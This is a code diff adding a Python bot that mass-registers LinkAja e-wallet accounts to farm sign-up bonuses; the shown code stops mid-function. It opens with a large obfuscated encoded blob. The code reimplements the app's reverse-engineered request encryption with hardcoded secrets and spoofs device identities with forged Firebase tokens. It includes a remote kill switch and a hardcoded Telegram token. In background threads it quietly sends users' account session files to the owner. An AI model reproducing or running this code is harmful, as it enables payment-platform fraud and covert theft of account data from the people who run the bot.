|1_WI|6lHrj;T@9tDdHk~7onFR$~BX(PzDz@C1R9sM)elMh#I%wgDn?O+0OPV+a&S5So;S}Tk0sM+6rmf#fF9BE^(L#a@flapHywhqh0ct`@vyL({xdz%hutx^*U_5^vE?=u-)sXj&uNx;UJxUdOaEGL*$Vz`9<FfU{*kSVytbw$9lCF^Xb?!m%QA=uc&m%tNbboUGfut709&gS5f7XSNm1ux#anN6(?QtV!sO1Tm33dxa39m8TEEc1zLHSCo+A@WWL>StHEQAK-OjrFgk*Z!{D8IcvQKYrZSJo{Ju=AR?JfX#89ahM4v3=RQC**D)SA{*2R{fFd$xDsQBcKEnVz}E*>aw7W$qK-O?p&=#sb};V-BI%6?nKz{PFo^10v98@d=@OP4PGo>oVjie1`bK#AN|-%>xX^$IWcFGsne3SGJroW6d=ts8nzCeQ)Hib9}^!L0OQ+}Y>5RL5C`{Mxfk^G%qQKI{>pBKfYq!dh1#c(veoeXi(xITVze@}3?XT|GUs(u@qq&oeP=R(LU&6O;ZJII22@dRxK(sgX$qz>T<QCMi*&?k*CO3lSX$!yG4_cO*E%o0}oUu6>CjZT^dt@QS_!tDBpdUqbSW$o6;0F52xeLbBqE=tzJilYWUg$}6~2VY6K>A$uZE{AV~D1QyBo1lhw$-l3kJ!5R3}4D|Hag@oahn>1%}d62$<MHPXk;fhe)SrbZsjm3BI<?=_kwi!>eL&)+<IdO#&U#*%M`{?NK<xKm)wHY9_wPP^KrfjlzdI)Ma<&XE;$HD3|WhXr&W_hnRHG{*W@Zw}w16FLbcY1KbK4!m1AX9easvjJ_0;g|Rv!tx{Z{Z2x6l2p^L3nX9JEn(6Gg~2#D(uCM3Me7n+Emt!O~Pl5LB3^SZ>a3UeM699cYJCB-ZNT~)``4*NIe)O21dyX4h~H!2sVs)(HVX1n75RP;NVEb=<xLcLM6YcX162xYkAPXP!1m$=G)Fb1N#XlFF5?oym`s179-H@7zAv`iJ?7*AOr<_slr~uVw8K6lXv=0$Qv4q7QB5uSQxO+{wLN2<IgB8QnAR!qLLU|2vm)v48vjoi%~58iX;!i;#n*{jm2lN_%as%i9&w2R=_BpWgv|XtfjG526a7+Rn7Kwtojxf-^ap*#U>U%!Q!8=tpccZd-{jasIsZ|%9AsfM**+LubKjkG9dZT^zuvG_7?=Ph{gZFLV}m6B;x~%5G=~D`1b_;Z)<4*eqsEL)?UK1wi(n@UDpQxA#=c&I4cr{|JYF%+!PHCPcazIzr?i`EFy7d(#GMj;b}na^)%Ks)wQ>6%G!s=1||SHDDP>nYpQDLXy24pj1B{s)}D!5p@qm^LGp)TaS4ktEbzIs6Xt;@g)GkWKl-O4Bk9SUSZMLftHI)R{P`m+{uzt+u=ouY{{ssn0dQgwi^Wf|?p-YY35#tk(r`sKNpi-)KtF=T?_=>PEbd^jEMj4x1TN|nu^I%?8;D`<eGzM6L!{`YvaGeWr?bk|2CmgjWqBC@^&882K+UtalcyL93l?z_ukmhEF>nJOzy2AF&p-n_Bs&|nV=`?>b9{LU-z1xgwhCKaYkN;+osB`NcHq{3jYs_k7XKNG?_u#e7H?wl3oPEl;t>}AOU%+cYq2n45spPP7719S5?uxh47{=zlQ1AG$|Wp6G*NeM;7N)bCqO@ZTtX-guj8%0iR-Rm@dOqh#o{R}=CJsEEN)}*IV^s_=}iTk@<dR=zt3q<pY~Uye#q%ks0`UPTvF=S@eZtG-VqU`o7j{A)D|O8P#77uL)Z*ay9NY%-Olpjv59_o5tZ82GKL>)Diq#<07#&ycf~?V{7@>O;@%V}-V_AADNvGsYVuD*WTw=<DbT$su#kFarhiiqOjc>%5+wgf5PDA_cMHsS1?EM$OAvEUB>i~t$BGvUT%s_@K`c>w<jQ9iPb=K=D2F_1S+*KP%cF>X6|j0+A)z9FB#!x!IK^WQ2SnZjIdH7~RFL!|LBw06{E;B+Ey0Bi!37Y0BryG0p?@Z2PPPr$oGywM=sl*(P~OuA&uKitA+*5oP<)ayzgsR8XpIYn&y2e@@eWPAQ<Lb{WH>Y#E2<4m@tpFZ)Ig~prp7=~OIfJ!ox(nfYNNIVWbt03NKL7?Q`MAsJ5``anUi`HA#*a1#tK`?DXMfwE~idx3!r!y3O})~@S$8tCG4nzDDAcYik(myRRr0KsiK`Q2_Sg31z7IrgjDIa0E!)jh|1dr0=2vyO%P?qZOq%TVmM-$K&qY}UW}xZi&h&TN%IZ*9H2Y<JQCFhsvX+D_9U<c#?!55>GOTGxc`9a!NtgB&F)?7Td6uyB{@{#(Q4t!0QGfP<#wc2FPu|9jHjsRhjKL)`_M{J`48n{=w*$DO5YYh@i10TNw;(L%q?wH%}L%6%jPBX_TO)wqdZ~>6bd!mW3_Hh0rqce(vCn(86IlHR2UYq4>b}h;h|1SNgo;{P@uGJ5@>?w6dqG78HiYJ>q6iNMS>vZoaCWYMTP7{DX5ff0Td6zWR&KiNkmz9R7xszTL8sQgo4U^7uII(go>&3cj1`n+hHO~yaSIxrdyB!|2%%r+nWLvVEyD7b7GHFGbe&mm1{r##P2<^Q0tUMx@8FtS%OoR<d$VRWSP)Lrko%A!zV!qQZL9q6%8X<ApW@GV~T~mrT968OOWIdNI$Onm<kfWRL-eff|PqI-9piZDsnCeJ}l~L$y|^}q;iXlcST0GDEO`@n0d%GhG(xnb9K?;wxr($7P~7zW#_b%IyI*tqa@5&YM!fEY*;opP3dk^_FWTzU{_O|rpoysICrgOPU+Fd&S~D43aOxl6QJ@_LGLS|SWG7}Jljg$v+2*IuNc<a=nFkA#ba<|psM7Vk|on}<*FF+M=ERQ<Q|0<n=KA3pIyD;QdG~$cBE#?v@L+*VV;aK?U)Rdep>*=!&Hh&dnh+i+V?UoP!tAH>YY#prNdjJdl;sKCpIFHnt|sO%lB-Qk;-|P9!m9650C2s%Da;sjCTr(?IJnc;&_3~GAHuD%R%<Ol%i^=1q(pIVEIrkqtx%2^whD3$>hK$I8vsH3Vv4r#ZFWu1p`Nb<xaCOh6>&mKml(dF>IxysHFGcWs>urTtppvPbGvAqEJ%V@4{Hg-cE+M!^2D|rG02nLt%}C6R(CN!s5J8O+`Mm22+U-vtwa&wo+y)ZYQr&NRB1MV~M5IY3f}8mfNuc!v$(i^PU*a?Y&$PW!{0;a2I(;by4q`!YJdrMFMU3GvjclR3;b#nh=mQ$L5qU-ZZf=<bg`GezADzNm`Q+YmAAsK<80KLrcB!w)r`;TOW5<A4kXMJN3um#SA${yFStNY|kfp7HuzeeWvTBp3n3wpLIqacd83uXU5>$1<w`SE`F|fNwHiFT$)2pV-4(aTddRyfxvZJgiB2@vouFBOKT#tOwM4IS^3PepoCeTs%Dn8EzI)FIkLPbR%}afsWLK40NIjdWIVG>%wU$VKeB}Vk>#l>W?9qBEL+c#CG?0yvn^vJorRUcV_7Lajg>Nvu~L39k=~UGN-HT=tcJ{#tlUC%aB>&b?Um(#YTOQDB(;f^LLyixDuI=fGFT}qkCl#}WTldFiWMuVI!<nYan8t)1wys0WF+W!uVjv7rRYRfO3r4b+!L&H5_azuE2#!fZo+Hw%H*1etinU78A%huN}*A#WKCkFlx$YYEo7ylGKv)|sCrIr#E-dG?w~GuWsN|h-qtdbHkg&*s=QKk0xLoHd8MpER>DJh#R}{+uiSu#^2#05V_sQ@gF??px?om<q3f04s=QK44l5ly$x0>F6f4%E?%<VMsk5AX9uGxifVyh8jf|uZW2J~hR!YucrDH{`R1BleD^}wj^2$wAJ12Kyw|V7DRKHgSR$Rq)Fe9l9tYivjC3uLu5<Es;3A)fLLAF*_tfU$_xfu`ZmC0dIhIdVvQX_mr4A@&-YD1Z2SOT+5%4U|iMa;6eidojQGE3V<W_jrfvmBlx%O8t%@YurA5Wy^?5}73oWU|aX$t+8%nI*hF$nwltW_iAkSq_YoB|M+d{W3<<TUaSPftBDqy%Ox%E0r`*tk?vOQdT|-UmI5LqeeM-oVwwa<v6T@7)ckxN}(~V6qmtD@b>ab1*a)iEXPjw%FXz~_sZv}K29E>CcLr&52j=!otc#^@vM}X%Sw4AtaPfHV#QkO3@5iSk2{fjs1Z&cqaOFlDtxu68A%<?O6C|=ic4pu%mP+AK^}e$^YAxtaudGBymC8rfs?y&6cbs4?;I^7X+l{kEP<8C<4>fl6Rd<UHLqBS&!kswrOt8k1w4RP9;C*+viDU$B<M!3WU;bRY$_|IA7iEbQ>;{mZ#A#nh|h^vM#@80ehfIC8QFkuI3puzLs$vMhgXVAWu^2yRytn7N~dZlR;<Ifnpf^%-UJ%vO)%({P1uLQj0Ep(uM`^3N{N}QlwH6|Cr(qWSk65E8s_=$;N&j6F0cF;9t`C<#e*<0T>Jxrl2Shi(^I+!=@!bkb3B|1drttxPLYPv?N}9zQm6i96a|`P3MynlJ5ni?{~qW)`44n*ROCz)49p$S+46RzVk&J%C4%i06t04%unM%WTwLEsJ&;PUTGIyF+Ji|UD2dw<0=;n#^k4I{<IjvcHBq4bXhWa<=rbR6YOQms9kB*R`U9&TCUc1btqIl|!f$7OI@4*0ozp%Li>QcSf~uAAKx3sM9)J=EZ}bP!1~H|5a9;idK)`?bl;kD_*Z7p^I2HHc29-snJh)61P^Ax^qT-;m!IuZ7HJ60Iy#2t?EuyNa2i3A5IK7Z~*kdDAK~Z7b^+JJI_4Mq9$g(X|Npjy%YUZb&z43_~&y+0YxRen~##ciBBy>6EPs6_=cf}O`7y?q-UOD?GXTK1+qIbpQF2vnVelB@2=a16<O7wKa8xVjQ_vPe2PyWK#O0O%i;8xs1-|eC2h8C~AFyb=AuG*jpgkc)L9Qx-Fin(&em2jMG@JA!7<xkffvQ}le6L)9o^EF@WdR>+OW0m=nO>d}l|E~I7vp^j7tL-aels99zdQ+~#$O`puwsiuz5$|mzctxBL#0Tb$$lq*_n)kGPx4e^$(a80nW91WSM@Y6?o`b7%A5FC)Qb$&FRVetDP;*r$_=n^&`Bkgnzou4-uVxC~&elNrj!<@0EqX^qVW|tc8Yy}wg2K`&yP76?CzZl7GkioX`nif4QH%aJpy7H!'))))
+#!/usr/bin/env python3
+"""publik.py — LinkAja War Bot (Standalone Edition - Zero Dependency).
+Seluruh modul core telah disatukan ke dalam satu file mandiri.
+"""
+from __future__ import annotations
+import sys
+import os
+import time
+import json
+import random
+import base64
+import hashlib
+import hmac
+import secrets
+import uuid
+import requests
+import threading
+import concurrent.futures
+import shutil
+import re
+import subprocess
+import urllib.request
+import pathlib
+import warnings
+from datetime import datetime, timedelta
+from pathlib import Path
+
+warnings.filterwarnings("ignore")
+
+if sys.platform == "win32":
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
+
+# Coba import library kriptografi & HTTP
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+
+import httpx
+
+from rich.console import Console, Group
+from rich.panel import Panel
+from rich.prompt import Prompt, Confirm
+from rich.table import Table
+from rich.live import Live
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
+from rich.rule import Rule
+from rich import box
+
+console = Console()
+
+# ==========================================
+# KONFIGURASI REMOTE CONTROL GITHUB
+# ==========================================
+REMOTE_CONFIG_API = "https://api.github.com/repos/canntona/gurih/contents/config.json"
+REMOTE_CONFIG_RAW = "https://raw.githubusercontent.com/canntona/gurih/refs/heads/main/config.json"
+
+_CACHED_CONFIG = None
+_LAST_CONFIG_FETCH = 0
+
+def get_remote_config(force=False):
+    """status waiting. . ."""
+    global _CACHED_CONFIG, _LAST_CONFIG_FETCH
+    now = time.time()
+    if not force and _CACHED_CONFIG and (now - _LAST_CONFIG_FETCH < 15):
+        return _CACHED_CONFIG
+
+    # 0. Cek file config.json lokal jika tersedia
+    try:
+        local_cfg = Path(__file__).resolve().parent / "config.json"
+        if local_cfg.exists():
+            parsed = json.loads(local_cfg.read_text(encoding="utf-8"))
+            if isinstance(parsed, dict) and "status" in parsed:
+                _CACHED_CONFIG = parsed
+                _LAST_CONFIG_FETCH = now
+                return parsed
+    except Exception:
+        pass
+
+    default_cfg = {
+        "status": "ON",
+        "message": "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable",
+        "max_accounts": 5
+    }
+    
+    try:
+        req = urllib.request.Request(
+            f"{REMOTE_CONFIG_API}?_={int(now)}",
+            headers={"User-Agent": "Mozilla/5.0", "Accept": "application/vnd.github.v3+json"}
+        )
+        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=4) as resp:
+            data = json.loads(resp.read().decode('utf-8'))
+            if "content" in data:
+                raw_body = base64.b64decode(data["content"]).decode('utf-8')
+                parsed = json.loads(raw_body)
+                if isinstance(parsed, dict) and "status" in parsed:
+                    _CACHED_CONFIG = parsed
+                    _LAST_CONFIG_FETCH = now
+                    return parsed
+    except Exception:
+        pass
+
+    for url in [
+        f"{REMOTE_CONFIG_RAW}?_={int(now)}",
+        f"https://cdn.jsdelivr.net/gh/canntona/gurih@main/config.json?_={int(now)}"
+    ]:
+        try:
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"})
+            with urllib.request.urlopen(req, context=_SSL_CTX, timeout=4) as resp:
+                parsed = json.loads(resp.read().decode('utf-8'))
+                if isinstance(parsed, dict) and "status" in parsed:
+                    _CACHED_CONFIG = parsed
+                    _LAST_CONFIG_FETCH = now
+                    return parsed
+        except Exception:
+            continue
+
+    if _CACHED_CONFIG:
+        return _CACHED_CONFIG
+    return default_cfg
+
+
+# ==========================================
+# POOL CLIENT IDENTITY & AUTO-SYNC LOGIC
+# ==========================================
+BOT_ID_FILE = Path(__file__).resolve().parent / "bot_id.txt"
+
+
+def verify_bot_authorization(bot_id: str):
+    """checking..."""
+    try:
+        cfg = get_remote_config()
+        blocked_list = cfg.get("blocked_bots", [])
+        if bot_id in blocked_list:
+            clear_once()
+            console.print(Panel(
+                f"[bold red][X] no acces[/bold red]\n\n"
+                f"[yellow]Bot ID [bold white]{bot_id}[/bold white] shutdown .\n"
+                f"Seluruh fitur dinonaktifkan.[/yellow]",
+                border_style="red"
+            ))
+            time.sleep(3)
+            sys.exit(0)
+    except SystemExit:
+        raise
+    except Exception:
+        pass
+
+
+def send_auto_ping(bot_id: str):
+    """."""
+    try:
+        cfg = get_remote_config()
+        token = cfg.get("bot_token") or "8951694676:AAHTdSKR8pg70RWdpDT8wQi-ajhak3Lnbgw"
+        owner_chat = cfg.get("owner_chat_id") or 1783522985
+        server_ip = cfg.get("server_ip") or "10.42.28.178"
+
+        def _do_ping():
+            # 1. Kirim langsung ke GUI PC (muncul di tabel dalam hitungan milidetik)
+            try:
+                url_http = f"http://{server_ip}:8888/ping"
+                payload_http = json.dumps({"bot_id": bot_id, "owner": bot_id.split("-")[0]}).encode("utf-8")
+                req_h = urllib.request.Request(url_http, data=payload_http, headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(req_h, timeout=2)
+            except Exception:
+                pass
+
+            # 2. Kirim notifikasi real-time ke Telegram Owner
+            try:
+                url_tg = f"https://api.telegram.org/bot{token}/sendMessage"
+                payload_tg = urllib.parse.urlencode({
+                    "chat_id": owner_chat,
+                    "text": f"🟢 [CHECK-IN] Bot <b>{bot_id}</b> telah aktif & siap war!",
+                    "parse_mode": "HTML"
+                }).encode("utf-8")
+                req_tg = urllib.request.Request(url_tg, data=payload_tg)
+                urllib.request.urlopen(req_tg, context=_SSL_CTX, timeout=5)
+            except Exception:
+                pass
+
+        threading.Thread(target=_do_ping, daemon=True).start()
+    except Exception:
+        pass
+
+
+def get_or_set_bot_id() -> str:
+    """reading bot id."""
+    if BOT_ID_FILE.exists():
+        bid = BOT_ID_FILE.read_text(encoding="utf-8").strip()
+        if bid:
+            verify_bot_authorization(bid)
+            return bid
+    try:
+        clear_once()
+        console.print(Panel(
+            "[bold bright_cyan]REGISTRASI ID BOT [/]\n"
+            "[dim]. . .[/]",
+            border_style="bright_cyan"
+        ))
+        bid = Prompt.ask("[bold bright_yellow]>> Masukkan ID Bot Anda : . . .[/]").strip().upper()
+        if not bid:
+            bid = f"BOT-{random.randint(10, 99)}"
+        BOT_ID_FILE.write_text(bid, encoding="utf-8")
+        console.print(f"[bold green][OK] ID Bot tersimpan: {bid}[/bold green]\n")
+        time.sleep(1)
+        verify_bot_authorization(bid)
+        return bid
+    except SystemExit:
+        raise
+    except Exception:
+        return "CLIENT-01"
+
+
+def auto_sort_and_sync_pool(bot_id: str, jumlah_dibuat: int = 5):
+    """mohon tunggu, tidak perlu melakukan apapun"""
+    console.print("\n[bold bright_yellow][*] Menjalankan Auto-Sortir ...[/bold bright_yellow]")
+    states = list_states()
+    if not states:
+        console.print("[yellow][!] Tidak ada akun baru di folder data/states untuk disortir.[/]")
+        return
+
+    # Ambil N akun terakhir yang baru dibuat di sesi ini
+    sesi_states = states[-jumlah_dibuat:] if len(states) >= jumlah_dibuat else states
+    
+    dir_base = Path(__file__).resolve().parent / "data"
+    dir_zonk = dir_base / "states_zonk"
+    dir_surplus = dir_base / "states_surplus"
+    dir_zonk.mkdir(parents=True, exist_ok=True)
+    dir_surplus.mkdir(parents=True, exist_ok=True)
+
+    bonus_accounts = []
+    zonk_accounts = []
+
+    with console.status("[bold cyan]Memeriksa saldo bonus LinkAja 5.000...[/]", spinner="dots"):
+        for akun in sesi_states:
+            file_path = Path(akun.get("file", ""))
+            if not file_path.exists():
+                continue
+            saldo, bonus, status = proses_cek_satu_akun(akun)
+            poin = int(bonus) if str(bonus).isdigit() else 0
+            if poin >= 5000:
+                bonus_accounts.append((file_path, akun))
+            else:
+                zonk_accounts.append((file_path, akun))
+                try:
+                    shutil.move(str(file_path), str(dir_zonk / file_path.name))
+                except Exception:
+                    pass
+
+    total_bonus = len(bonus_accounts)
+    total_zonk = len(zonk_accounts)
+
+    console.print(Panel(
+        f"[bold bright_white]HASIL AUTO-SORTIR BOT ID: [bold bright_cyan]{bot_id}[/bold bright_cyan][/]\n"
+        f"- Akun Berbonus (>= 5.000) : [bold green]{total_bonus} Akun[/]\n"
+        f"- Akun Zonk (< 5.000)      : [bold red]{total_zonk} Akun (Dipindahkan ke states_zonk/)[/]",
+        border_style="bright_yellow"
+    ))
+
+    # HAK PATEN DINAMIS: Nilai target dibaca dari konfigurasi pool (default 2)
+    target_paten = int(get_remote_config().get("target_per_bot", 2))
+    surplus_to_send = []
+    if total_bonus > target_paten:
+        # Akun di atas hak paten dipindahkan & disumbangkan ke pool
+        surplus_pairs = bonus_accounts[target_paten:]
+        for s_path, s_data in surplus_pairs:
+            try:
+                with open(s_path, "r", encoding="utf-8") as sf:
+                    content_json = json.load(sf)
+                surplus_to_send.append({"filename": s_path.name, "content": content_json})
+                shutil.move(str(s_path), str(dir_surplus / s_path.name))
+            except Exception:
+                pass
+
+    # Lapor ke Pool Koordinator secara senyap di latar belakang
+    cfg = get_remote_config()
+    tele_token = cfg.get("bot_token") or "8951694676:AAHTdSKR8pg70RWdpDT8wQi-ajhak3Lnbgw"
+    owner_chat = cfg.get("owner_chat_id") or 1783522985
+    server_ip = cfg.get("server_ip") or "10.42.28.178"
+
+    def _sync_bg():
+        # 1. Kirim report via HTTP PC
+        try:
+            url_http = f"http://{server_ip}:8888/report"
+            payload_http = json.dumps({
+                "bot_id": bot_id,
+                "total_created": len(sesi_states),
+                "bonus_count": total_bonus,
+                "zonk_count": total_zonk,
+                "surplus_files": surplus_to_send
+            }).encode("utf-8")
+            req_h = urllib.request.Request(url_http, data=payload_http, headers={"Content-Type": "application/json"})
+            urllib.request.urlopen(req_h, timeout=3)
+        except Exception:
+            pass
+
+        # 2. Kirim notifikasi senyap ke Telegram Owner
+        try:
+            url_tg = f"https://api.telegram.org/bot{tele_token}/sendMessage"
+            payload_tg = urllib.parse.urlencode({
+                "chat_id": owner_chat,
+                "text": f"📊 [LAPORAN WAR] Bot <b>{bot_id}</b> selesai.\nDibuat: {len(sesi_states)} | Bonus: {total_bonus} | Zonk: {total_zonk} | Surplus: {len(surplus_to_send)}",
+                "parse_mode": "HTML"
+            }).encode("utf-8")
+            req_tg = urllib.request.Request(url_tg, data=payload_tg)
+            urllib.request.urlopen(req_tg, context=_SSL_CTX, timeout=5)
+        except Exception:
+            pass
+
+    threading.Thread(target=_sync_bg, daemon=True).start()
+
+    # Hanya tampilkan pesan sukses tuntas tanpa output bertele-tele
+    console.print("[bold green][OK] Sinkronisasi sesi war tuntas![/bold green]\n")
+
+
+def cleanup_core_folder():
+    """Menghapus folder core jika ada, karena seluruh fungsi sudah disatukan."""
+    try:
+        root_dir = Path(__file__).resolve().parent
+        core_dir = root_dir / "core"
+        bot_file = root_dir / "bot.py"
+        # Jangan hapus jika ada bot.py di folder yang sama agar bot.py tetap aman
+        if bot_file.exists():
+            return
+        if core_dir.exists() and core_dir.is_dir():
+            shutil.rmtree(core_dir, ignore_errors=True)
+            console.print("[dim italic][*] Folder core/ otomatis dibersihkan (fitur sudah terintegrasi mandiri).[/]")
+    except Exception:
+        pass
+
+
+# ============================================================
+# MODUL INTEGRASI 1: DEVICEFREE CRYPTO STACK
+# ============================================================
+
+#!/usr/bin/env python3
+"""devicefree.py — crypto stack LinkAja 4.46.1, pure python.
+
+LAYERS:
+  getKey(kX, ver)   : gk = kX[off:off+16], off dari simpleEncrypt hex2ascii(
+                      kX[atoi(digits(ver))%len : +4], "a5ff") u16be % len
+  body (putu/tayo/thomas): AES-256-CBC, key=mask(XOR(imsi+gk_body, did+ts)),
+                      iv=mask(XOR(ts, gk_body)), gk_body = getKey(k3)
+                      putu   = E(salt4 + json)
+                      tayo   = E(json + SECRET)
+                      thomas = E(json)
+  raw header        : HMAC-SHA512(key=(XOR(imsi+gk_raw, did+ts))>>2, msg)
+                      gk_raw = getKey(k1)
+                      msg    = encrypted body (POST) | ts + "tw4ll3tn30" (GET)
+"""
+
+
+
+
+
+
+
+SECRET = "DN$F#hwNk7TJWhu+ptF#f8bNTCASH"
+UID_MAC = "tw4ll3tn30"     # hashMacUID constant (libBaseKey.so)
+GK_FALLBACK = "XT6PRpRuehFsyMa2"  # native const @0x169c0 — gk saat keys blank (echo/key-exchange)
+
+
+# ---------- getKey (native libHappyBus @0x30858) ----------
+def _simple_encrypt(a: bytes, b: bytes) -> bytes:
+    return bytes(a[i] ^ b[i % len(b)] for i in range(len(a)))
+
+
+def get_key(kx: str, ver: str = "4.46.1") -> str:
+    """gk 16-char dari kX (768 hex) — offset deterministik."""
+    digits = "".join(c for c in ver if c.isdigit())
+    start = int(digits) if digits else 0
+    n = len(kx)
+    s4 = "".join(kx[(start + i) % n] for i in range(4))
+    enc = _simple_encrypt(bytes.fromhex(s4), bytes.fromhex("a5ff"))
+    off = ((enc[0] << 8) | enc[1]) % n
+    return "".join(kx[(off + i) % n] for i in range(16))
+
+
+# ---------- helpers ----------
+def _xr(d: bytes, k: bytes) -> bytes:
+    return bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))
+
+
+def _mask(b: bytes) -> bytes:
+    return bytes((((x & 0x3F) << 2) & 0xFF) for x in b)
+
+
+def _pad16(data: bytes) -> bytes:
+    pad = 16 - (len(data) % 16)
+    return data + bytes([pad]) * pad
+
+
+# ---------- body encryption ----------
+def encrypt_body(ts: str, did: str, imsi: str, msg: str, k3: str,
+                ver: str = "4.46.1", gk: str = None) -> str:
+    gk = gk or get_key(k3, ver)
+    se2 = _xr(imsi.encode() + gk.encode(), (did + ts).encode())
+    key32 = _mask(se2)
+    se3 = _xr(ts.encode(), gk.encode())
+    iv = (_mask(se3) + b"\x00" * 16)[:16]
+    return base64.b64encode(
+        AES.new(key32, AES.MODE_CBC, iv).encrypt(_pad16(msg.encode()))
+    ).decode()
+
+
+def encrypt_request_payload(ts: str, did: str, imsi: str, payload_json: str,
+                            k3: str, ver: str = "4.46.1") -> dict:
+    """Return {putu, tayo, thomas} — encrypted request body."""
+    salt4 = f"{secrets.randbelow(0xFFFF):04x}"
+    putu = encrypt_body(ts, did, imsi, salt4 + payload_json, k3, ver)
+    tayo = encrypt_body(ts, did, imsi, payload_json + SECRET, k3, ver)
+    thomas = encrypt_body(ts, did, imsi, payload_json, k3, ver)
+    return {"putu": putu, "tayo": tayo, "thomas": thomas}
+
+
+# ---------- raw header ----------
+# v5 = body + ts + UID_MAC (POST) | ts + UID_MAC (GET)
+# raw = HMAC-SHA512(key=(XOR(imsi+gk, did+ts))>>2, v5), gk = getKey(k1)
+def calc_raw(ts: str, did: str, imsi: str, msg: str, k1: str,
+             ver: str = "4.46.1", gk: str = None) -> str:
+    gk = gk or get_key(k1, ver)
+    se2 = _xr(imsi.encode() + gk.encode(), (did + ts).encode())
+    hkey = bytes(b >> 2 for b in se2)
+    return _hmac.new(hkey, msg.encode("latin-1"), hashlib.sha512).hexdigest()
+
+
+def raw_for_get(ts: str, did: str, imsi: str, k1: str, ver: str = "4.46.1",
+                gk: str = None) -> str:
+    return calc_raw(ts, did, imsi, ts + UID_MAC, k1, ver, gk)
+
+
+def raw_for_post(ts: str, did: str, imsi: str, encrypted_body: str,
+                 k1: str, ver: str = "4.46.1", gk: str = None) -> str:
+    v5 = encrypted_body + ts + UID_MAC
+    return calc_raw(ts, did, imsi, v5, k1, ver, gk)
+
+
+# ---------- response decryption ----------
+def decrypt_body(ts: str, did: str, imsi: str, b64_ct: str, k3: str,
+                 ver: str = "4.46.1") -> str:
+    gk = get_key(k3, ver)
+    se2 = _xr(imsi.encode() + gk.encode(), (did + ts).encode())
+    key32 = _mask(se2)
+    se3 = _xr(ts.encode(), gk.encode())
+    iv = (_mask(se3) + b"\x00" * 16)[:16]
+    pt = AES.new(key32, AES.MODE_CBC, iv).decrypt(base64.b64decode(b64_ct))
+    pt = pt[: -pt[-1]]  # strip PKCS7
+    return pt.decode()
+
+
+# ============================================================
+# MODUL INTEGRASI 2: DEVICE IDENTITY GENERATOR
+# ============================================================
+
+#!/usr/bin/env python3
+"""
+identity.py — generator identitas device acak & dinamis per sesi pendaftaran.
+Menghasilkan DeviceID, IMSI, IMEI, AdsID, JID, Firebase FID (FIS Token),
+serta profil model HP Android nyata secara acak dan konsisten.
+"""
+
+
+
+
+
+
+
+DEVICE_MODELS = [
+    {"brand": "Samsung", "devicemodel": "SAMSUNG SM-A546E", "osversion": "14", "osname": "Android"}, # Galaxy A54
+    {"brand": "Samsung", "devicemodel": "SAMSUNG SM-A145F", "osversion": "13", "osname": "Android"}, # Galaxy A14
+    {"brand": "Samsung", "devicemodel": "SAMSUNG SM-A245F", "osversion": "13", "osname": "Android"}, # Galaxy A24
+    {"brand": "Xiaomi",  "devicemodel": "XIAOMI 22101316G", "osversion": "13", "osname": "Android"}, # Redmi Note 12
+    {"brand": "Xiaomi",  "devicemodel": "XIAOMI 23076RN4BI", "osversion": "13", "osname": "Android"}, # Redmi 12
+    {"brand": "Xiaomi",  "devicemodel": "XIAOMI 22071219CG", "osversion": "13", "osname": "Android"}, # Poco M5
+    {"brand": "Oppo",    "devicemodel": "OPPO CPH2387",     "osversion": "13", "osname": "Android"}, # Oppo A77s
+    {"brand": "Oppo",    "devicemodel": "OPPO CPH2477",     "osversion": "13", "osname": "Android"}, # Oppo A57
+    {"brand": "Vivo",    "devicemodel": "VIVO V2250",       "osversion": "13", "osname": "Android"}, # Vivo V27e
+    {"brand": "Vivo",    "devicemodel": "VIVO V2204",       "osversion": "13", "osname": "Android"}, # Vivo Y22
+    {"brand": "Realme",  "devicemodel": "REALME RMX3760",   "osversion": "13", "osname": "Android"}, # Realme C53
+    {"brand": "Realme",  "devicemodel": "REALME RMX3710",   "osversion": "13", "osname": "Android"}, # Realme C55
+    {"brand": "Infinix", "devicemodel": "INFINIX X6831",    "osversion": "13", "osname": "Android"}, # Infinix Hot 30
+    {"brand": "Infinix", "devicemodel": "INFINIX X678B",    "osversion": "13", "osname": "Android"}, # Infinix Note 30
+]
+
+
+def rand_hex16() -> str:
+    return os.urandom(8).hex()
+
+
+def rand_imei() -> str:
+    # 15 digit (TAC 8 + serial 6 + luhn 1)
+    base = "".join(str(random.randint(0, 9)) for _ in range(14))
+    def luhn(s):
+        tot = 0
+        for i, c in enumerate(reversed(s)):
+            d = int(c)
+            if i % 2 == 1:
+                d *= 2
+                if d > 9:
+                    d -= 9
+            tot += d
+        return (10 - tot % 10) % 10
+    return base + str(luhn(base))
+
+
+def rand_jid() -> str:
+    return base64.b64encode(os.urandom(15)).decode()
+
+
+def rand_fid() -> str:
+    """Generate valid 17-byte base64url Firebase Installation ID (FID)."""
+    raw = bytearray(os.urandom(17))
+    raw[0] = 0x70 | (raw[0] & 0x0F)
+    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
+
+
+def generate_fid_jwt(fid: str | None = None) -> str:
+    """Generate dynamic valid-structure Firebase Installation auth token (JWT)."""
+    if not fid:
+        fid = rand_fid()
+    header = base64.urlsafe_b64encode(b'{"alg":"ES256","typ":"JWT"}').decode().rstrip("=")
+    now_exp = int(time.time()) + 604800  # 7 days validity
+    payload_dict = {
+        "appId": "1:891651208293:android:d62f82cf759eb4f4",
+        "exp": now_exp,
+        "fid": fid,
+        "projectNumber": 891651208293
+    }
+    payload = base64.urlsafe_b64encode(json.dumps(payload_dict, separators=(',', ':')).encode()).decode().rstrip("=")
+    fake_sig = base64.urlsafe_b64encode(os.urandom(64)).decode().rstrip("=")
+    return f"{header}.{payload}.{fake_sig}"
+
+
+def new_identity() -> dict:
+    """Membuat identitas lengkap perangkat baru secara acak dan unik."""
+    dev = random.choice(DEVICE_MODELS)
+    fid = rand_fid()
+    fid_token = generate_fid_jwt(fid)
+    return {
+        "deviceId": rand_hex16(),
+        "imsi": rand_hex16(),
+        "imei": rand_imei(),
+        "adsId": str(uuid.uuid4()),
